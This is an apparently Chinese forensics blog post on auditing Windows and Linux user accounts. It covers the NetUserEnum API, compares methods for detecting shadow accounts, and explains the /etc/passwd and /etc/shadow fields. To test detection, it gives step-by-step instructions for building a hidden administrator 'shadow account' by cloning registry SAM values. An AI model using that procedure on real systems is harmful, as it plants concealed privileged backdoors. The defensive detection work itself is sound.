NET_API_FUNCTION NetUserEnum(  LPCWSTR servername,  DWORD   level,  DWORD   filter,  LPBYTE  *bufptr,  DWORD   prefmaxlen,  LPDWORD entriesread,  LPDWORD totalentries,  PDWORD  resume_handle);</code></pre><h4 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h4><p>** servername**</p><p>一个指向常量字符串的指针，该字符串指定要执行该函数的远程服务器的DNS或NetBIOS名称。如果该参数为NULL，表示使用本地计算机。</p><p>** level**</p><p>指定数据的信息级别。此参数可以是以下值之一。</p><p>PARAMETERS</p><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>返回用户帐号名称。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_0">USER_INFO_0</a>结构的数组。</td></tr><tr><td><strong>1</strong></td><td>返回有关用户帐户的详细信息。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_1">USER_INFO_1</a>结构的数组。</td></tr><tr><td><strong>2</strong></td><td>返回有关用户帐户的详细信息，包括授权级别和登录信息。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_2">USER_INFO_2</a>结构的数组。</td></tr><tr><td><strong>3</strong></td><td>返回有关用户帐户的详细信息，包括授权级别、登录信息、用户和主组的rid以及配置文件信息。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_3">USER_INFO_3</a>结构的数组。</td></tr><tr><td><strong>10</strong></td><td>返回用户名和帐户名以及评论。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_10">USER_INFO_10</a>结构的数组。</td></tr><tr><td><strong>11</strong></td><td>返回有关用户帐户的详细信息。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_11">USER_INFO_11</a>结构的数组。</td></tr><tr><td><strong>20</strong></td><td>返回用户名和标识符以及各种帐户属性。bufptr参数指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_20">USER_INFO_20</a>结构的数组。注意，在Windows XP和更高版本上，建议您使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_23">USER_INFO_23</a>代替。</td></tr></tbody></table><p><strong>filter</strong></p><p>指定要包含在枚举中的用户帐户类型的值。值为0表示应该包括所有正常的用户、信任数据和机器帐户数据。</p><p>此参数也可以是以下值的组合。</p><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>FILTER_TEMP_DUPLICATE_ACCOUNT</strong></td><td>枚举主帐户位于另一个域中的用户的帐户数据。此帐户类型提供对此域的用户访问，但不提供对信任此域的任何域的访问。用户管理器将此帐户类型称为本地用户帐户。</td></tr><tr><td><strong>FILTER_NORMAL_ACCOUNT</strong></td><td>枚举普通用户帐户数据。此帐户类型与一个典型的用户相关联。</td></tr><tr><td><strong>FILTER_INTERDOMAIN_TRUST_ACCOUNT</strong></td><td>枚举域间信任帐户数据。此帐户类型与信任其他域的域的信任帐户相关联。</td></tr><tr><td><strong>FILTER_WORKSTATION_TRUST_ACCOUNT</strong></td><td>枚举工作站或成员服务器信任帐户数据。此帐户类型与域成员计算机的计算机帐户相关联。</td></tr><tr><td><strong>FILTER_SERVER_TRUST_ACCOUNT</strong></td><td>枚举成员服务器计算机帐户数据。此帐户类型与属于该域成员的备份域控制器的计算机帐户相关联。</td></tr></tbody></table><p><strong>bufptr</strong></p><p>一个指向接收数据的缓冲区的指针。该数据的格式取决于level参数的值。</p><p>该数据的缓冲区由系统分配，应用程序必须调用NetApiBufferFree函数来释放已分配的内存，当返回的数据不再需要时。注意，即使NetUserEnum函数以ERROR_MORE_DATA失败，也必须释放缓冲区。</p><p><strong>prefmaxlen</strong></p><p>返回数据的首选最大长度(以字节为单位)。如果指定了MAX_PREFERRED_LENGTH, NetUserEnum函数将为数据分配所需的内存。如果在此参数中指定另一个值，则可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有表项，则函数返回ERROR_MORE_DATA。有关更多信息，请参见网络管理功能缓冲区和网络管理功能缓冲区长度。</p><p><strong>entriesread</strong></p><p>一个指向值的指针，该值接收实际枚举的元素计数。</p><p><strong>totalentries</strong></p><p>一个指向一个值的指针，该值接收可以从当前恢复位置枚举的条目总数。请注意，应用程序应该只将此值视为一种提示。如果您的应用程序正在与Windows 2000或更高版本的域控制器通信，您应该考虑使用ADSI LDAP Provider更有效地检索这种类型的数据。ADSI LDAP Provider实现了一组支持各种ADSI接口的ADSI对象。有关更多信息，请参见ADSI服务提供商。</p><p>LAN管理器: 如果呼叫是对一台正在运行LAN管理器2的计算机。， totalentries参数将始终反映数据库中条目的总数，而不管条目在恢复序列中的位置。</p><p><strong>resume_handle</strong></p><p>一个指向包含简历句柄的值的指针，该句柄用于继续现有的用户搜索。句柄在第一次调用时应该为零，在后续调用时保持不变。如果此参数为NULL，则不存储resume句柄。</p><h4 id="返回值详解"><a href="#返回值详解" class="headerlink" title="返回值详解"></a>返回值详解</h4><p>如果函数成功，返回值为NERR_Success。</p><p>如果函数失败，返回值可以是以下错误码之一。</p><table><thead><tr><th>返回代码</th><th>描述</th></tr></thead><tbody><tr><td><strong>ERROR_ACCESS_DENIED</strong></td><td>用户无法访问所请求的信息。</td></tr><tr><td><strong>ERROR_INVALID_LEVEL</strong></td><td>系统调用级别不正确。如果level参数设置为不支持的值，则返回此错误。</td></tr><tr><td><strong>NERR_BufTooSmall</strong></td><td>缓冲区太小，不能包含一个条目。没有任何信息被写入缓冲区。</td></tr><tr><td><strong>NERR_InvalidComputer</strong></td><td>计算机名无效。</td></tr><tr><td><strong>ERROR_MORE_DATA</strong></td><td>更多的条目是可用的。指定一个足够大的缓冲区来接收所有条目。</td></tr></tbody></table><p>NetUserEnum功能检索关于指定远程服务器或本地计算机上的所有用户帐户的信息。</p><p>NetQueryDisplayInformation功能可用于快速枚举用户、计算机或全局组帐户信息，以便在用户界面中显示。</p><p>如果您正在为Active Directory编程，您可能能够调用某些Active Directory服务接口(ADSI)方法来实现与调用网络管理用户函数相同的功能。有关更多信息，请参见IADsUser和IADsComputer。</p><p>如果在运行Active Directory的域控制器上调用NetUserEnum函数，将根据安全对象的ACL (access control list)允许或拒绝访问。默认ACL允许所有经过认证的用户和“windows 2000兼容前访问”组的成员查看这些信息。如果在成员服务器或工作站上调用此函数，则所有经过身份验证的用户都可以查看该信息。有关匿名访问和在这些平台上限制匿名访问的信息，请参见网络管理功能的安全要求。有关acl、ACEs和访问令牌的更多信息，请参见访问控制模型。</p><p>NetUserEnum函数只返回调用者具有Read访问权限的信息。调用者必须具有对域对象的列表内容访问权，并枚举位于系统容器中的SAM服务器对象的整个SAM域访问权。</p><p>可以使用LsaEnumerateTrustedDomains或LsaEnumerateTrustedDomainsEx函数来检索被LSA (Local Security Authority)策略对象信任的域的名称和sid。</p><p>NetUserEnum函数不返回所有系统用户。它只返回那些通过调用NetUserAdd函数添加的用户。不能保证用户列表将按顺序返回。</p><p>如果调用NetUserEnum函数并为level参数指定信息级别1、2或3，则检索到的每个结构的密码成员都设置为NULL，以保证密码安全。</p><p>用户名长度限制为20个字符，用户组名长度限制为256个字符。另外，帐户名不能以句点结尾，不能包含逗号或以下可打印字符: “，/，，[，]，: ，|，&lt;，&gt;，+，=，;，?，*。名称也不能包括1-31范围内的字符，这是不可打印的。</p><p>NetUserEnum函数不支持级别为4的参数，也不支持USER_INFO_4结构。NetUserGetInfo函数支持4级参数和USER_INFO_4结构。</p><h4 id="使用netuserenum编译程序"><a href="#使用netuserenum编译程序" class="headerlink" title="使用netuserenum编译程序"></a>使用netuserenum编译程序</h4><p>这里可以参考yangsir的工具也可以用官方的用例自己调整。</p><p><a href="https://www.cnblogs.com/Yang34/p/14242026.html">https://www.cnblogs.com/Yang34/p/14242026.html</a></p><h3 id="各命令行语句的能力对比"><a href="#各命令行语句的能力对比" class="headerlink" title="各命令行语句的能力对比"></a>各命令行语句的能力对比</h3><p>为了对影子账户的检出能力对比研究，这里需要首先需要创建隐藏账号/影子账号。之后我们用之前的各个命令尝试查询影子账号，并对影子账号结果进行跟踪</p><h4 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h4><p>环境：首先确定administrator已经配置了密码，如果没有可以在计算机管理中找到本地用户和组，用户，如下修改密码。如果后面需要远程登陆或者登陆桌面的话需要保证需要复制的账户的已经配置了密码，这里是计划复制administrator账户权限的。</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620696172673-c138aca8-ccfe-4b70-8fea-0fcee666380a.png" class="" title="image.png"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620696403659-56b347d4-f4d4-44ae-8676-37cd0e80328c.png" class="" title="image.png"><p>首先，新建个影子账户</p><pre><code>C: \Users\xt&gt;net user Administrat0r 123 /add命令成功完成。</code></pre><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620696924809-4f775155-68a7-4e0b-89b0-b6cdfe5a2926.png" class="" title="image.png"><p>regedit进入注册表</p><p>计算机\HKEY_LOCAL_MACHINE\SAM\SAM</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620663313507-3904fada-3e0e-41a5-82ed-e229191e4a58.png" class="" title="image.png"><p>给予sam权限</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620663247950-8262659b-7059-4aa0-97bc-4db900268867.png" class="" title="image.png"><p>显示如下</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620663365251-649ed25c-95f1-4c67-9640-cab73562b0a8.png" class="" title="image.png"><p>刷新F5，展开找到administrator账户的键值0x1f4</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620663921155-2467f37d-cc70-4dc7-b5b4-6af03416975d.png" class="" title="image.png"><p>打开0x1f4中F对应的十六进制值，复制并替换掉，我们新建的Administrat0r账户对应的F数值数据</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620696622163-031b4a20-8dd6-4f46-a5d9-269cbc00737e.png" class="" title="image.png"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620696975870-343ea54e-3fef-48f8-931e-a22a5497d9b3.png" class="" title="image.png"><p>导出0x3E9对应的注册表为reg格式文档，然后在计算机管理中删除Administrat0r账户</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620664570825-a725cf04-53ab-4a06-9f3f-136c8ad1b766.png" class="" title="image.png"><p>此时注册表已没有相关注册信息</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620664642562-bd0a9b4c-cbb6-49b0-83fb-f1922459a414.png" class="" title="image.png"><p>这时使用导出的reg导入</p><p>administra…</p><p>注册表编辑器</p><p>CusersxtDesktopladministratoreg中包含的项和值已成功添加到注册表中</p><p>确定</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620664701643-8dea9626-fa5b-4785-8331-2d9a49c37123.png" class="" title="image"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620697060914-71d013de-9cf0-4c45-bfb4-744cd1e7f7a0.png" class="" title="image.png"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620664800331-a5ad71c6-242f-48ce-bc05-997a7c2a4035.png" class="" title="image.png"><p>登陆测试成功，影子账户添加成功。</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620701383738-f8c06915-114f-44d1-a1c6-afb8e90b4707.png" class="" title="image.png"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620961872748-fd0b722c-0809-4a61-876f-960c7f5c0f8f.png" class="" title="image.png"><p>此时还无法直接登陆，因为无法自定义输入用户名，这里需要修改本地策略</p><p><strong>进入经典登录模式的设置方法：</strong></p><ul><li><strong>win+R——secpol.msc</strong></li><li><strong>本地策略——安全选项 交互式登录——不显示上次的用户名——已启用</strong></li><li><strong>交互式登录——不需要按下Ctrl+Alt+Del——已禁用</strong></li><li><strong>重启登录——Ctrl+Alt+Del</strong></li></ul><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620698978583-5c28d2c7-f54c-4d26-ad20-d45a18a45a1b.png" class="" title="image.png"><p>实验步骤总结: </p><ol><li>administrator添加密码，新增administrat0r用户</li><li>复制xt（管理员权限）的F值到administrat0r的对应F值中，导出administrat0r对应Names中账户注册表以及Users中对应的对应注册表，只导出一个注册表最终会导致无法正常登陆</li><li>删除administrat0r账户</li><li>导入保存的2个注册表</li><li>尝试使用administrat0r用户名远程登陆登陆，成功登陆xt账户中</li></ol><h4 id="查询影子账户查询能力测试"><a href="#查询影子账户查询能力测试" class="headerlink" title="查询影子账户查询能力测试"></a>查询影子账户查询能力测试</h4><pre><code>C: \Users\xt&gt;net user\\DESKTOP-D9ITQNU 的用户帐户-------------------------------------------------------------------------------Administrator            DefaultAccount           Guesttest                     WDAGUtilityAccount       xt命令成功完成。C: \Users\xt&gt;net localgroup administrators别名     administrators注释     管理员对计算机/域有不受限制的完全访问权成员-------------------------------------------------------------------------------Administratorxt命令成功完成。C: \Users\xt&gt;C: \Users\xt\Downloads\1.exeUser account on (null):         -- Administrat0r$        -- Administrator        -- DefaultAccount        -- Guest        -- test        -- WDAGUtilityAccount        -- xtTotal of 7 entries enumeratedC: \Users\xt&gt;wmic useraccount get nameNameAdministrat0r$AdministratorDefaultAccountGuesttestWDAGUtilityAccountxt</code></pre><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620963241494-42ed9f9a-4d59-40a4-b2d0-adfa7d501143.png" class="" title="image.png"><table><thead><tr><th><strong>查询方法</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td>net user</td><td></td></tr><tr><td>Net localgroup</td><td></td></tr><tr><td>wmic useraccount</td><td>可查影子账号</td></tr><tr><td>注册表</td><td>可查影子账号</td></tr><tr><td>NetUserEnum函数（编译的程序查询）</td><td>可查影子账号</td></tr></tbody></table><h4 id="清理影子账户"><a href="#清理影子账户" class="headerlink" title="清理影子账户"></a>清理影子账户</h4><p>删除<code>计算机\HKEY_LOCAL_MACHINE\SAM\SAM</code>中对应影子账号的键值即可。</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620963241494-42ed9f9a-4d59-40a4-b2d0-adfa7d501143.png" class="" title="image.png"><h2 id="linux查看系统用户"><a href="#linux查看系统用户" class="headerlink" title="linux查看系统用户"></a>linux查看系统用户</h2><p>linux因为目前未出现隐藏账号的手段，目前审计用户只需要针对两个文件下的账户做审计即可。</p><h3 id="用户信息文件-etc-passwd"><a href="#用户信息文件-etc-passwd" class="headerlink" title="用户信息文件/etc/passwd"></a>用户信息文件/etc/passwd</h3><p>root: x: 0: 0: root: /root: /bin/bash</p><p>account: password: UID: GID: GECOS: directory: shell</p><p>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</p><p>注意：无密码只允许本机登陆，远程不允许登陆</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="影子文件-etc-shadow"><a href="#影子文件-etc-shadow" class="headerlink" title="影子文件/etc/shadow"></a>影子文件/etc/shadow</h3><p>root: $6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/: 16809: 0: 99999: 7: : : </p><p>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</p><h4 id="用户名"><a href="#用户名" class="headerlink" title="用户名"></a>用户名</h4><p>用户名称</p><h4 id="加密密码"><a href="#加密密码" class="headerlink" title="加密密码"></a>加密密码</h4><p>如果格式为”$id$salt$hashed”，则表示该用户密码正常。这里保存的是真正加密的密码。</p><p>目前 Linux 的密码采用的是 SHA512 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。</p><pre><code>留空 开头的表示用户没有密码!    表明用户被锁，被锁账户无法登陆，但可能使用其他方式登陆如私钥认证ssh或su*  表明用户被锁，!! 表明用户从来没设置过密码$6$开头的，表明是用SHA-512加密的，$1$ 表明是用MD5加密的$2$ 是用Blowfish加密的$5$ 是用 SHA-256加密的。</code></pre><p>注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件透过这个功能，在密码串前加上 “!”、”*” 或 “x” 使密码暂时失效。</p><p>所有伪用户的密码都是 “!!” 或 “*”，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 “!!”，代表这个用户没有密码，不能登录。</p><h4 id="最后一次修改时间"><a href="#最后一次修改时间" class="headerlink" title="最后一次修改时间"></a>最后一次修改时间</h4><p>最后一次修改密码的时间“16809”的理解。</p><p>这是因为，Linux 计算日期的时间是以 1970 年 1 月 1 日作为 1 不断累加得到的时间，到 1971 年 1 月 1 日，则为 366 天。这里显示 16809天，也就是说，此 root 账号在 1970 年 1 月 1 日之后的第 16809 天修改的 root 用户密码。</p><p>可以使用如下命令进行换算：</p><pre><code>┌──(x7㉿x7)-[~]└─$ date -d &quot;1970-01-01 16809 day&quot;     2016年 01月 09日 星期六 00: 00: 00 CST</code></pre><h4 id="最小修改时间间隔"><a href="#最小修改时间间隔" class="headerlink" title="最小修改时间间隔"></a>最小修改时间间隔</h4><p>最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。</p><h4 id="密码有效期"><a href="#密码有效期" class="headerlink" title="密码有效期"></a>密码有效期</h4><p>经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。</p><p>该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。</p><h4 id="密码需要变更前的警告天数"><a href="#密码需要变更前的警告天数" class="headerlink" title="密码需要变更前的警告天数"></a>密码需要变更前的警告天数</h4><p>与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 “再过 n 天你的密码就要过期了，请尽快重新设置你的密码！”。</p><p>该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 “修改密码” 的警告信息。</p><h4 id="密码过期后的宽限天数"><a href="#密码过期后的宽限天数" class="headerlink" title="密码过期后的宽限天数"></a>密码过期后的宽限天数</h4><p>也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登陆，也不会提示账户过期，是完全禁用。</p><p>比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。</p><h4 id="账号失效时间"><a href="#账号失效时间" class="headerlink" title="账号失效时间"></a>账号失效时间</h4><p>同第 3 个字段一样，使用自 1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！</p><p>该字段通常被使用在具有收费服务的系统中。</p><h3 id="who"><a href="#who" class="headerlink" title="who"></a>who</h3><pre><code>who     查看当前登录用户（tty本地登陆  pts远程登录）</code></pre><p><strong>who</strong>命令能够打印 <strong>当前都有谁**</strong>登录到系统中** 的相关信息 。who命令只会显示真正登录到系统中的用户。它不会显示那些通过<strong>su</strong>命令切换用户的登录者，<strong>也就是说who不会枚举出所有用户，只是列出正在登陆的用户相关信息</strong>。</p><pre><code>root@cheerful-push-1: ~# whoroot     pts/0        2021-05-17 03: 54 (ip地址)root     pts/1        2021-05-17 03: 54 